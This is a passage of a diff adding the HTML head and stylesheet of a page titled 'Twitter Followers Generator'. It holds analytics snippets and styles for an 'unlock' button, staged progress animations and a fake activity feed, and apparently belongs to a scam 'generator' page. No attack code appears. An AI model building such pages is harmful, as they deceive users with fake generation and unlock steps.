@@ -1,0 +1,2205 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Twitter Followers Generator</title>
+  <meta name="description" content="Twitter Followers Generator">
+  <meta property="og:title" content="Twitter Followers Generator">
+  <meta property="og:description" content=
+  "Twitter Followers Generator">
+  <meta name="referrer" content="no-referrer">
+  <script src="https://browser.sentry-cdn.com/6.4.1/bundle.min.js"
+  integrity=
+  "sha384-THoc7rflwZFKTdZNgv6jLFFDn299Uv3t1SW5B4yGLvLiCRTYP9ys6vXZcMl95TQF"
+  crossorigin="anonymous"></script>
+  <script>
+    Sentry.init({
+        dsn: 'https://e0e6a104cb354a09bf094a90e676ea13@o425163.ingest.sentry.io/5780930',
+        tracesSampleRate: 0.01
+    });
+  </script>
+  <script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+
+    ga('create', 'UA-215795449-1', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+  <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        body{
+  font-family: Roboto;
+  background: radial-gradient(#ffffff, #00afe6);
+  background-size: cover;
+
+  }
+  .icon2{
+  width:60px;
+  margin-top:-60px;
+  }
+  .line2{
+  height: 1px;
+  width: 100%;
+  background-color: #ebebeb;
+  }
+  .activity {
+  max-width: 700px;
+  width:90%;
+  overflow: hidden;
+  background-color: #00000070;
+  text-align: center;
+  margin-top: 5px;
+  border-radius: 8px;
+  position: relative;
+  padding-top:10px;
+  border-style: solid;
+  border-width: 5px;
+  border-color: white;
+  }
+  .recent-name{
+  background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/163625547888815ad092c740326cefa3b3427798ce.png");
+  background-size: 22px;
+  background-repeat: no-repeat;
+  padding-left: 30px;
+  text-align: left;
+  margin-left: 10px;
+        font-size: 18px;
+        color:#f50c4f;
+        font-weight: bold;
+        margin-top: 10px;
+  }
+  .recent-right{
+  font-size: 20px;
+        color:black;
+        font-weight: bold;
+  }
+
+
+  .recent-icon{
+  display: block;
+  margin-top: 30px;
+  position: relative;
+  }
+  .bg-progress{
+  background-color: #b2d6f2;
+  width:100%;
+  margin-top: 15px;
+  padding:20px 0px 20px 0px;
+        box-shadow: 0px -1px 5px #b2d6f2;
+  }
+  .pro-bar-bg{
+  width:95%;
+  height: 5px;
+  background-color: #393b3d;
+  position: relative;
+        text-align: left;
+  }
+  .step1{
+  width: 26px;
+  height: 26px;
+  border-radius: 50%;
+  background-color: #ffe0bb;
+  position: absolute;
+  top:-11px;
+  }
+  .step2{
+  width: 26px;
+  height: 26px;
+  border-radius: 50%;
+  background-color: #393b3d;
+  position: absolute;
+  top:-11px;
+  left:50%;
+  }
+  .step3{
+  width: 26px;
+  height: 26px;
+  border-radius: 50%;
+  background-color: #393b3d;
+  position: absolute;
+  top:-11px;
+  right: 0px;
+  }
+  .gen-text2{
+  position: absolute;
+  top:-20px;
+  left:20%;
+    color:black;
+  }
+  .gen-text1{
+  position: absolute;
+  top:-20px;
+  left:70%;
+    color:black;
+  }
+  .pro-bar{
+        width: 0px;
+        height: 100%;
+        background-color: #ffe0bb;
+  }
+
+
+  .text-size28-black{
+        font-size: 20px;
+        color:black;
+        font-weight: bold;
+        margin-top: 5px;
+  }
+
+  .bg1{
+  background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16362544817b5a7298181843ad8abfa7745011c951.png");
+  background-size:150px, 300px;
+  position: absolute;
+  top:0px;
+  left:0px;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  animation: bganimation 20s linear infinite;
+  }
+  @keyframes bganimation {
+  0% { transform: scale(1);top:0px;
+  }
+    50% {  transform: scale(1.3);top:0px;
+
+    }
+  100% {  transform: scale(1);top:0px;
+  }
+
+  }
+  .bgcontainer{
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  top:0;
+  left:0;
+  }
+
+
+  .bgst{
+  position: absolute;
+  width: 10px;
+  transform: rotate(45deg);
+  left:0px;
+  top:-20px;
+  }
+  .bg{
+  background-color: white;
+  width: 100%;
+  height: 100%;
+  }
+  .vbicon{
+  display: inline-block;
+  width: 30px;
+  height: 30px;
+  background-color:red;
+  padding-top:10px;
+  }
+  .text1{
+  font-size: 26px;
+  color:#00afe6;
+  font-weight: bold;
+  margin: 5px;
+  }
+  .text2{
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+    margin-top: 10px;
+  }
+  .logo{
+  width: 280px;
+  z-index: 2;
+  margin-top: -140px;
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -o-user-select: none;
+  user-select: none;
+  }
+  .p1{
+  max-width: 700px;
+  width:90%;
+  background-color:#00000070;
+  border-radius: 8px;
+  margin-top: 150px;
+  position: relative;
+  border-style: solid;
+  border-width: 5px;
+  border-color: white;
+  }
+  .footer-data{
+  width: 100%;
+  position: relative;
+  height: 110px;
+  }
+  .bntnext{
+  background-color:#629ad4;
+      border-radius: 40px  ;
+      width: 200px  ;
+      padding-top: 20px  ;
+      padding-bottom: 20px  ;
+      position: relative;
+      /* bottom: 120  px  ; */      /* left: 50%; */
+      color: white;
+      font-weight: bold;
+      /* margin-left: -100
+  px
+  ; */
+      cursor: pointer;
+      margin-top: 10px;
+      border-style: solid;
+      border-width: 4px;
+      border-color:#8eb9dc;
+  }
+  .setting{
+  width: 120px;
+  margin-top: 20px;
+  }
+  .gen-text{
+  font-family: 'Bangers', cursive;
+  margin-top: 10px;
+  font-size: 30px;
+  color:#ffffff;
+    letter-spacing: 2px;
+    padding-left: 10px;
+  padding-right: 10px;
+  }
+  .bntsent{
+  background-image: linear-gradient(#039dff,#42ddff);
+  border-radius: 40px;
+  width: 200px;
+  padding-top: 20px;
+  padding-bottom: 20px;
+  position: absolute;
+  bottom: 20px;
+  left: 50%;
+  color: white;
+  font-weight: bold;
+  margin-left: -100px;
+  cursor: pointer;
+  }
+  .inputname {
+    margin-top: 14px;
+  text-align: left;
+   outline: none;
+      appearance: none;
+      -moz-appearance: none;
+      -webkit-appearance: none;
+    background-color: #e0e1e4;
+    border-radius: 8px;
+      box-shadow: none;
+      border: none;
+      width: 90%;
+      height: 60px;
+      z-index: 3;
+      position: relative;
+      padding: 0 0px 0 40px;
+      color:#383d43;
+      font-weight:  bold;
+      font-size: 26px;
+  background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/163625547888815ad092c740326cefa3b3427798ce.png");
+  background-repeat: no-repeat;
+    background-position: left;
+    background-size: 20px;
+    /* background: left; */
+    /* margin-left: 10; */
+    background-position-x: 15px;
+    animation: bgshadow 2s linear infinite;
+  }
+    @keyframes bgshadow {
+    0% { box-shadow: 5px 0px 10px #8eb9dc;}
+    25% { box-shadow: 0px 5px 10px #8eb9dc;}
+    50% { box-shadow: -5px 0px 10px #8eb9dc;}
+    75% { box-shadow: 0px -5px 10px #8eb9dc;}
+    100% { box-shadow: 5px 0px 10px #8eb9dc;}
+  }
+
+
+  .message{
+    margin-top: 14px;
+  text-align: left;
+   outline: none;
+      appearance: none;
+      -moz-appearance: none;
+      -webkit-appearance: none;
+    background-color: #e0e1e4;
+    border-radius: 40px;
+      box-shadow: none;
+      border: none;
+      width: 90%;
+      height: 200px;
+      z-index: 3;
+      position: relative;
+      padding: 10px;
+      color:White;
+      font-size: 26px;
+  }
+  .Allplatform{
+
+  }
+  .platform{
+    border-style: solid;
+  border-color: #ffffff21;
+  border-width: 2px;
+      position: relative;
+    border-radius: 30px;
+    margin-top:20px;
+    width: 100px;
+    height: 100px;
+
+    display: inline-block;
+    color:#292d41;
+    background-image: url("     https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636028648f6032aea1946be0df68c24c51fad1d4c.png");
+    background-size: 70px;
+    background-repeat: no-repeat;
+    background-position: top;
+    cursor: pointer;
+  }
+  .left{
+    position: absolute;
+    left: 40px;
+    top: 180px;
+    width: 61px;
+    height: 61px;
+    cursor: pointer;
+    background-color: #ffffff;
+    border-radius: 50%;
+    border-style: solid;
+    border-color: #8eb9dc;
+    background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16356530176cfc353938d74d4e5ed284df3d691d77.png");
+    background-repeat: no-repeat;
+    background-position: center;
+      }
+      .right{
+        position: absolute;
+        right:40px;
+        top:180px;
+        width: 61px;
+        height: 61px;
+        cursor: pointer;
+        background-color: #ffffff;
+        border-radius: 50%;
+        border-style: solid;
+        border-color: #8eb9dc;
+        background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/1635653018aa8c8b95dbd3fa38458e80ffac02a309.png");
+        background-repeat: no-repeat;
+        background-position: center;
+          }
+  h1{
+  font-family: 'Bangers', cursive;
+  color:white;
+  font-size: 42px;
+  }
+  .cardvalue{
+  font-family: 'Bangers', cursive;
+  color:#00afe6;
+  font-size: 42px;
+  margin-top:20px;
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -o-user-select: none;
+  user-select: none;
+  }
+  .coinlogo{
+  width: 150px;
+  height: 150px;
+  margin-top: 0px;
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -o-user-select: none;
+  user-select: none;
+  }
+
+
+  .platform2{
+    border-style: solid;
+  border-color: #ffffff21;
+  border-width: 2px;
+      position: relative;
+    border-radius: 30px;
+    margin-top:20px;
+    width: 100px;
+    height: 100px;
+  /*  background-color: #292d41;*/
+    display: inline-block;
+    color:#ffffff;
+    background-image: url("     https://d13pxqgp3ixdbh.cloudfront.net/uploads/163602864880c1fe352cf62ca52301943a3c420c8e.png");
+    background-size: 70px;
+    background-repeat: no-repeat;
+    background-position: top;
+      cursor: pointer;
+  }
+  .platform3{
+    border-style: solid;
+  border-color: #ffffff21;
+  border-width: 2px;
+      position: relative;
+    border-radius: 30px;
+    margin-top:20px;
+    width: 100px;
+    height: 100px;
+  /*  background-color: #292d41;*/
+    display: inline-block;
+    color:#292d41;
+    background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16356530149871f3ad26cacfb5ad62be3af4f83078.png");
+    background-size: 70px;
+    background-repeat: no-repeat;
+    background-position: top;
+      cursor: pointer;
+  }
+  .platform4{
+    border-style: solid;
+  border-color: #ffffff21;
+  border-width: 2px;
+    position: relative;
+    border-radius: 30px;
+    margin-top:20px;
+    width: 100px;
+    height: 100px;
+  /*  background-color: #292d41;*/
+    display: inline-block;
+    color:#292d41;
+    background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16356530209e46ef11b612e6f52b6e6b67f322a7af.png");
+    background-size: 70px;
+    background-repeat: no-repeat;
+    background-position: top;
+      cursor: pointer;
+  }
+  .platform5{
+    border-style: solid;
+  border-color: #ffffff21;
+  border-width: 2px;
+    position: relative;
+    border-radius: 30px;
+    margin-top:20px;
+    width: 100px;
+    height: 100px;
+  /*  background-color: #292d41;*/
+    display: inline-block;
+    color:#292d41;
+    background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/163611839977cfd342f8ae1b25823c8221c15af1a8.png");
+    background-size: 70px;
+    background-repeat: no-repeat;
+    background-position: top;
+      cursor: pointer;
+  }
+  .platform6{
+    border-style: solid;
+  border-color: #ffffff21;
+  border-width: 2px;
+    position: relative;
+    border-radius: 30px;
+    margin-top:20px;
+    width: 100px;
+    height: 100px;
+  /*  background-color: #292d41;*/
+    display: inline-block;
+    color:#292d41;
+    background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16361183913f4301ca41defd0f9a0092b0a4577103.png");
+    background-size: 70px;
+    background-repeat: no-repeat;
+    background-position: top;
+      cursor: pointer;
+  }
+
+  .text-platform{
+    position: absolute;
+    bottom: 10px;
+    width:100%;
+  }
+  .text{
+    position: relative;
+    text-align: center;
+  }
+
+  .card{
+  width:200px;
+  margin-top: 14px;
+  text-align: left;
+  outline: none;
+  appearance: none;
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  background-color: #292d41;
+  border-radius: 40px;
+  box-shadow: none;
+  border: none;
+  width: 70%;
+  height: 60px;
+  z-index: 3;
+  position: relative;
+  padding: 0 0px 0 40px;
+  color:White;
+  font-size: 26px;
+
+  background-repeat: no-repeat;
+  background-position: left;
+  background-size: 20px;
+  /* background: left; */
+  /* margin-left: 10; */
+  background-position-x: 15px;
+  }
+
+  .select-items{
+  color: #ffffff;
+  padding: 8px 16px;
+  border: 1px solid transparent;
+  border-color: transparent transparent rgba(0, 0, 0, 0.1) transparent;
+  cursor: pointer;
+  user-select: none;
+  }
+
+  .update{
+  position: absolute;
+  right: 10;
+  top:10;
+  color:#00b0ff;
+  }
+
+
+  .footer{
+  position: absolute;
+  bottom: 10px;
+  width: 260px;
+  left: 50%;
+  margin-left: -130px;
+  }
+
+  .footer-gen{
+  position: absolute;
+      bottom: 30px  ;
+      width: 90%;
+      left: 4%;
+      /* margin-left: 5%; */
+      background-color: #629ad461;
+      border-radius: 8px  ;
+      padding: 5px  ;
+  }
+  .gen-id{
+  display: inline-block;
+  background-image: url(https://d13pxqgp3ixdbh.cloudfront.net/uploads/163625547888815ad092c740326cefa3b3427798ce.png);
+  height: 32px;
+  background-size: 32px;
+  background-repeat: no-repeat;
+  padding-left: 32px;
+  }
+  .gen-vbuck{
+    display: inline-block;
+    background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636254594ee7dd38a3897d9333016ab86503b5611.png");
+    height: 32px;
+    background-size: 32px;
+    background-repeat: no-repeat;
+    padding-left: 32px;
+  }
+  .user-gen{
+  font-size: 20px;
+  color:white;
+  display: inline-block;
+  padding-top: 4px;
+
+  }
+
+  .private{
+  display:inline-block;
+  margin: 5px;
+  cursor: pointer;
+  }
+
+  .Tem{
+  display:inline-block;
+    margin: 5px;
+    cursor: pointer;
+  }
+
+  .Contact{
+  display:inline-block;
+    margin: 5px;
+    cursor: pointer;
+  }
+
+  .line{
+  width: 100%;
+  height: 1px;
+  background-color: #bcdbf4;
+  position: absolute;
+  bottom: 90px;
+  }
+  .privacy-form{
+  position: absolute;
+  top:0;
+  left:0;
+  width: 100%;
+  height: 100%;
+  background-color: #1b1d2791;
+  z-index: 3;
+  }
+  /* width */
+  ::-webkit-scrollbar {
+  width: 10px;
+  }
+
+  /* Track */
+  ::-webkit-scrollbar-track {
+
+  }
+
+  /* Handle */
+  ::-webkit-scrollbar-thumb {
+  background: #595d6e;
+  border-radius: 50px;
+  }
+
+  /* Handle on hover */
+  ::-webkit-scrollbar-thumb:hover {
+  background: #555;
+  }
+  .privacy-content{
+  scroll-behavior: smooth;
+  max-width: 700px;
+  width:90%;
+  height: 90%;
+  background-color: #b2d6f2;
+  border-radius: 30px;
+  margin-top: 20px;
+  position: relative;
+  border-style: solid;
+  border-width: 1px;
+  border-color: #8eb9dc;
+  overflow-y: scroll;
+  color:black;
+  text-align: center;
+  padding: 10;
+  }
+  .contact-content{
+  scroll-behavior: smooth;
+  max-width: 700px;
+  width:90%;
+  margin-top:200px;
+  background-color: #b2d6f2;
+  border-radius: 8px;
+  position: relative;
+  border-style: solid;
+  border-width: 1px;
+  border-color: #8eb9dc;
+  overflow-y: scroll;
+  color:black;
+  text-align: center;
+  padding-bottom: 100px;
+  }
+  .close-privacy{
+  position: sticky;
+  width: 50px;
+  height: 50px;
+  background-image:url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/1635653008bcf79fa6496b864fa08b6a0ead44fc87.png");
+  background-repeat: no-repeat;
+  background-size: 40px;
+  border-radius: 50%;
+  background-position: center;
+  cursor: pointer;
+  background-color:#92cefe ;
+  top:5px;
+  left:5px;
+  border-style: solid;
+  border-width: 4px;
+  border-color: #8eb9dc;
+  }
+
+  .pro-bg{
+  margin-top: 10px;
+  width: 80%;
+  max-width: 250px;
+  height: 35px;
+  background-color: #1e1f1f;
+
+  text-align: left;
+  transform: skew(-5deg);
+  }
+  .pro-bar{
+  margin-top: 10px;
+  width: 20%;
+  height: 100%;
+  background-color: #fdba02;
+  }
+
+
+  /*Animation*/
+  .skeyAni{
+  animation: skeyAni 0.5s ;
+  animation-fill-mode: forwards;
+  }
+  @keyframes skeyAni {
+  0% {transform: skew(10deg, 10deg);  }
+  25% {transform: skew(-10deg, -10deg);  }
+  50% {transform: skew(10deg, 10deg);  }
+  75% {transform: skew(-10deg, -10deg);  }
+  100% {transform: skew(0deg, 0deg); }
+  }
+
+
+  .slowrotatebg{
+  animation: slowrotatebg 100s infinite;
+  }
+  @keyframes slowrotatebg {
+  0% { transform: rotate(0deg);left:0 }
+  50% { transform: rotate(3deg); left:10%;transform: scale(1.2);}
+    100% { transform: rotate(0deg);left:0 }
+  }
+  .hloadingAni{
+    animation: hloadingAni 0.5s infinite;
+  }
+  @keyframes hloadingAni {
+  0% { left:0px; }
+
+  100% { left:100%; }
+  }
+
+
+  .updown4{
+  animation: updown 4s infinite;
+  }
+  @keyframes updown {
+  0% { margin-top:100px; }
+  50% { margin-top:130px }
+  100% { margin-top:100px }
+  }
+
+  .moveup{
+  animation: moveup 0.1s ;
+  animation-fill-mode: forwards;
+  }
+  @keyframes moveup {
+  0% { margin-top:0px; }
+  100% { margin-top:-10px }
+  }
+
+  .movedown{
+  animation: movedown 0.1s ;
+  animation-fill-mode: forwards;
+  }
+  @keyframes movedown {
+  0% { margin-top:-10px; }
+  100% { margin-top:0px }
+  }
+
+  .zoomout{
+  animation: zoomout 0.1s ;
+  animation-fill-mode: forwards;
+  }
+  @keyframes zoomout {
+  0% { transform: scale(1);}
+  100% { transform: scale(1.1); }
+  }
+
+  .zoomoutflash{
+  animation: zoomout 0.1s ;
+  animation-fill-mode: forwards;
+  }
+  @keyframes zoomout {
+  0% { transform: scale(0.1);opacity: 0;}
+  75% { transform: scale(1.1); }
+  100% { transform: scale(1);opacity: 1; }
+  }
+
+
+  .zoomin{
+  animation: zoomin 0.1s ;
+  animation-fill-mode: forwards;
+  }
+  @keyframes zoomin {
+  0% { transform: scale(1.1);}
+  100% { transform: scale(1); }
+  }
+
+
+  .pro0To100{
+  animation: pro0To100 4s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro0To100 {
+  0% { width:0 }
+  100% { width:100% }
+  }
+  .pro10{
+  animation: pro10 1s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro10 {
+  0% { width:0 }
+  100% { width:10% }
+  }
+  .pro10to20{
+  animation: pro10to20 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro10to20 {
+  0% { width:10% }
+  100% { width:20% }
+  }
+  .pro20to30{
+  animation: pro20to30 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro20to30 {
+  0% { width:20% }
+  100% { width:30% }
+  }
+  .pro30to40{
+  animation: pro30to40 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro30to40 {
+  0% { width:30% }
+  100% { width:40% }
+  }
+  .pro40to50{
+  animation: pro40to50 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro40to50 {
+  0% { width:40% }
+  100% { width:50% }
+  }
+  .pro50to60{
+  animation: pro50to60 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro50to60 {
+  0% { width:50% }
+  100% { width:60% }
+  }
+  .pro60to70{
+  animation: pro60to70 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro60to70 {
+  0% { width:60% }
+  100% { width:70% }
+  }
+  .pro70to80{
+  animation: pro70to80 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro70to80 {
+  0% { width:70% }
+  100% { width:80% }
+  }
+
+  .pro80to90{
+  animation: pro80to90 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro80to90 {
+  0% { width:80% }
+  100% { width:90% }
+  }
+  .pro90to96{
+  animation: pro80to90 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro80to90 {
+  0% { width:90% }
+  100% { width:96% }
+  }
+
+  .pro20to70{
+  animation: pro20to70 4s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro20to70 {
+  0% { width:20% }
+  100% { width:70% }
+  }
+
+  .pro70to94{
+  animation: pro70to94 2s;
+  box-shadow: black 0px 0px 5px;
+  animation-fill-mode: forwards;
+  }
+  @keyframes pro70to94 {
+  0% { width:70% }
+  100% { width:94% }
+  }
+  .heartbeat{-webkit-animation:heartbeat 1.5s ease-in-out infinite both;animation:heartbeat 1.5s ease-in-out infinite both}
+  @-webkit-keyframes heartbeat{from{-webkit-transform:scale(1);transform:scale(1);-webkit-transform-origin:center center;transform-origin:center center;-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out}10%{-webkit-transform:scale(.91);transform:scale(.91);-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in}17%{-webkit-transform:scale(.98);transform:scale(.98);-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out}33%{-webkit-transform:scale(.87);transform:scale(.87);-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in}45%{-webkit-transform:scale(1);transform:scale(1);-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out}}@keyframes heartbeat{from{-webkit-transform:scale(1);transform:scale(1);-webkit-transform-origin:center center;transform-origin:center center;-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out}10%{-webkit-transform:scale(.91);transform:scale(.91);-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in}17%{-webkit-transform:scale(.98);transform:scale(.98);-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out}33%{-webkit-transform:scale(.87);transform:scale(.87);-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in}45%{-webkit-transform:scale(1);transform:scale(1);-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out}}
+
+
+  .sakeanimation{
+  animation: shake 0.5s;
+
+  }
+  @keyframes shake {
+  0% { margin-left:0 }
+  10% { margin-left:-10px }
+  20% { margin-left:0 }
+  30% { margin-left:10px }
+  40% { margin-left:0 }
+  50% { margin-left:-5px }
+  60% { margin-left:0 }
+  70% { margin-left:5px }
+  80% { margin-left:0 }
+  90% { margin-left:-3px }
+  1000% { margin-left:0 }
+  }
+
+
+  .selectedcard{
+  animation: selectedcard 0.5s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes selectedcard {
+  0% { transform: scale(1.2);
+    transform: translateX(0em) perspective(200px) rotateY(10deg);
+  }
+  100% { transform: scale(1);
+
+  }
+  }
+
+
+
+
+
+  .hideanimation{
+  animation: hideanimation 0.4s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes hideanimation {
+  0% { opacity: 1;}
+  100% {opacity: 0;}
+  }
+
+  .hidein{
+  animation: flyinhide 1s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes flyinhide {
+  0% { transform: scale(1);}
+  10% { transform: scale(0.9);}
+  20% { transform: scale(1.1);}
+  100% { transform: scale(0);}
+  }
+
+  .showin{
+  animation: showin 0.5s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showin {
+  0% { transform: scale(0);}
+  30% { transform: scale(1);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+
+  .showin1{
+  animation: showin1 1s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showin1 {
+  0% { transform: scale(0);}
+  30% { transform: scale(1);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+
+  .showin2{
+  animation: showin2 1.4s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showin2 {
+  0% { transform: scale(0);}
+  30% { transform: scale(1);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+
+  .showin3{
+  animation: showin3 1.8s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showin3 {
+  0% { transform: scale(0);}
+  30% { transform: scale(1);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+
+  .showin4{
+  animation: showin4 2.2s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showin4 {
+  0% { transform: scale(0);}
+  30% { transform: scale(1);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+
+  .showin5{
+  animation: showin4 2.2s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showin4 {
+  0% { transform: scale(0);}
+  30% { transform: scale(1);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+
+  .showinplatform{
+  animation: showinplatform 1s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showinplatform {
+  0% { transform: scale(0);}
+  30% { transform: scale(0.9);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+  .rotate{
+  animation: step2animation 4s  linear infinite;
+  }
+  @keyframes step2animation{
+  0%  {transform: rotate(0deg);}
+  100%  {transform:  rotate(360deg);}
+  }
+  .showinname{
+  animation: showinname 1s;
+  animation-fill-mode: forwards;
+  }
+  @keyframes showinname {
+  0% { transform: scale(0);}
+  30% { transform: scale(0.9);}
+  60% { transform: scale(1.1);}
+  100% { transform: scale(1);}
+  }
+
+  .slit-out-vertical{animation:slit-out-vertical .5s ease-in both}
+  @keyframes slit-out-vertical{0%{transform:translateZ(0) rotateY(0);opacity:1}54%{transform:translateZ(-160px) rotateY(87deg);opacity:1}100%{transform:translateZ(-800px) rotateY(90deg);opacity:0}}
+
+  .lds-ring {
+  display: inline-block;
+  position: relative;
+  width: 80px;
+  height: 80px;
+  transform: scale(0.6);
+  }
+  .lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border: 8px solid #fdba02;
+  border-radius: 50%;
+  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+  border-color: #fdba02 transparent transparent transparent;
+  }
+  .lds-ring div:nth-child(1) {
+  animation-delay: -0.45s;
+  }
+  .lds-ring div:nth-child(2) {
+  animation-delay: -0.3s;
+  }
+  .lds-ring div:nth-child(3) {
+  animation-delay: -0.15s;
+  }
+  @keyframes lds-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+  }
+
+  @media only screen and (max-width:480px) {
+
+  .p1{
+  margin-top:150px;
+  }
+  .platform{
+  width:80px;
+  height: 80px;
+  border-radius: 20px;
+  background-size: 50px;
+  }
+  .platform2{
+  width:80px;
+  height: 80px;
